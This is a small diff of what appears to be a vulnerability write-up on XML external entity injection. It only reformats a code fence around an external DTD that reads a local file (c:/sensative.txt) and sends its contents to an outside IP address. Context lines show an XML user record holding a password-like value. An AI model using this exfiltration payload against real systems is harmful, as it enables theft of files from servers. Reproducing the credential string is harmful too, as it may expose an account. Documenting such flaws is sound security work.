@@ -61,8 +61,9 @@ PASSWORD="3jkY15nHscTNeexdKq+gVqiMsh1ngexPj4of7xliF3uDjnkTkJw7qq78ruSMvOGat"
 UID="A2A9235502DE" LOGIN="research" DOMAIN="EC2AMAZ-57EH5UL" ALLRIGHTS="YES"
 ALLAGENTS="YES"><DESCRIPTION></DESCRIPTION><ROLES/></USER>]]></USER></USERS></PACKAGE>```
 
-```External DTD code hosted on attacker server as xxe.dtd:
-<!ENTITY % data SYSTEM "file:///c:/sensative.txt">
+External DTD code hosted on attacker server as xxe.dtd:
+
+```<!ENTITY % data SYSTEM "file:///c:/sensative.txt">
 <!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://52.15.202.214:8080/?%data;'>">```
 
 
